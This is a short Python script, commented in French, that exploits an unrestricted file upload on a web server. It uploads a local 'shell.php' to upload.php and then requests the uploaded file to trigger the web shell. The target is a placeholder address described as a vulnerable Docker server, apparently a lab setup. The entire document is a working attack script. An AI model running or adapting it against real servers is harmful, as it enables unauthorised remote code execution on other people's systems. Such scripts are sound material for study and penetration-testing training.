import requests
import sys

# Configuration
target = "http://<IP_SERVER_WEB>:80"   # URL du serveur vulnérable (Docker)
upload_url = f"{target}/upload.php"
shell_filename = "shell.php"

# 1. Upload du fichier malveillant
files = {"file": (shell_filename, open(shell_filename, "rb"), "application/x-php")}
print(f"[+] Upload de {shell_filename} vers {upload_url}")
r = requests.post(upload_url, files=files)

if r.status_code == 200:
    print("[+] Upload réussi !")
else:
    print("[-] Erreur lors de l'upload")
    sys.exit(1)

# 2. Déclenchement du shell
shell_url = f"{target}/upload/{shell_filename}"
print(f"[+] Déclenchement du shell via {shell_url}")
requests.get(shell_url)
